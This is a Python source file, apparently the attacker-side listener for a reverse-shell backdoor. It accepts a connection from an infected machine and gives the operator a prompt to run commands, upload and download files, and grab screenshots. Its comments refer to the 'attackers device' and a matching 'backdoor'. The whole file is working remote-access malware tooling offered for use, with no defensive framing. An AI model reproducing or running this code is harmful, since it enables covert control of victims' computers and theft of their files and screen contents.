import socket
import json
import base64

class Listener :
    def __init__(self,ip,port) :
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        print("\n[+] listening for incoming connections \n")
        listener.listen(0)
        (self.connection,adress) = listener.accept()
        print(f"[+] got a connection from {adress[0]} on port {adress[1]} \n")

    def j_send(self,command) :
        data = json.dumps(command)
        self.connection.send(data.encode('utf-8'))

    def j_recv(self) :
        data = ""
        while True :
            try :
                data += self.connection.recv(1024).decode('utf-8')
                return json.loads(data)
            except :
                continue

    def read_file(self,path) :
        try :
            with open(path,"rb") as file :
                output = base64.b64encode(file.read()).decode('utf-8')
            return output
        except :
            print("No such file is present please check")
            return

    def write_file(self,path,data) :
        try :
            with open(path,"wb") as file :
                file.write(base64.b64decode(data))
            return "Sucessfully downloaded the file"
        except Exception as e :
            error = str(e) + "This error has been ocucurred"
            return error

    def get_output(self,command) :
        if command[0] == "upload" and len(command) > 1 :
            command.append(self.read_file(command[1]))
        self.j_send(command)
        if command[0] == "exit" :
            return
        elif command[0] == "download" and len(command) > 1 :
            return self.write_file(command[1],self.j_recv())
        elif command[0] == "screenshot" :
            return self.write_file(command[1],self.j_recv())
        else :
            return self.j_recv()

    def run(self) :
        output = 1
        while output :
            command = input(">> ").split(" ")
            output = self.get_output(command)
            print(output)
        self.connection.close()

l = Listener("ip",port)
# Enter ip , port of attackers device
# The ip , port should be same in both backdoor , server
l.run()
